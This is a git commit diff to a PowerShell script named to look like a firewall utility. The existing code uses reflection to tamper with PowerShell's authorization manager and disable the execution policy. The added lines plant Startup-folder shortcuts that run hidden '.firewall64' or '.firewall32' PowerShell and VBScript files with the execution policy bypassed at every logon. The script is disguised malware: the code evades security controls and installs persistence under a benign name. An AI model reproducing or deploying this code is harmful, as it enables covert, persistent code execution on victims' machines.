c1429f86454b1a5f9b964e90d39d7e63f55566e2
fxhxyz4 <fxhxyz8@gmail.com>
2025-01-27 20:07:59 +0300

    Update .firewallx.ps1

--- .firewallx.ps1
+++ .firewallx.ps1
@@ -1,8 +1,37 @@
+$startupFolder = [System.Environment]::GetFolderPath('Startup')
+
 function Disable-ExecutionPolicy {
     ($ctx = $executioncontext.gettype().getfield('_context','nonpublic,instance').getvalue($executioncontext)).gettype().getfield('_authorizationManager','nonpublic,instance').setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager 'Microsoft.PowerShell'))
 };
 
 Disable-ExecutionPolicy;
+
+$osBit = if ([Environment]::Is64BitOperatingSystem) { "64" } else { "32" }
+
+$ps1File = ".firewall$osBit.ps1" 
+$vbsFile = ".firewall$osBit.vbs"
+
+if (Test-Path $ps1File) {
+    $ps1Shortcut = Join-Path -Path $startupFolder -ChildPath "firewall.ps1.lnk"
+    $shell = New-Object -ComObject WScript.Shell
+    $shortcut = $shell.CreateShortcut($ps1Shortcut)
+    $shortcut.TargetPath = "powershell.exe"
+    $shortcut.Arguments = "-ExecutionPolicy Bypass -File `"$ps1File`""
+    $shortcut.IconLocation = "powershell.exe"
+    $shortcut.Save()
+} else {
+    Write-Error "File $ps1File not exist"
+}
+
+if (Test-Path $vbsFile) {
+    $vbsShortcut = Join-Path -Path $startupFolder -ChildPath "firewall.vbs.lnk"
+    $shortcut = $shell.CreateShortcut($vbsShortcut)
+    $shortcut.TargetPath = $vbsFile
+    $shortcut.IconLocation = "cscript.exe"
+    $shortcut.Save()
+} else {
+    Write-Error "File $vbsFile not exist"
+}
 
 $downloadsPath = [Environment]::GetFolderPath("UserProfile") + "\Downloads"
 
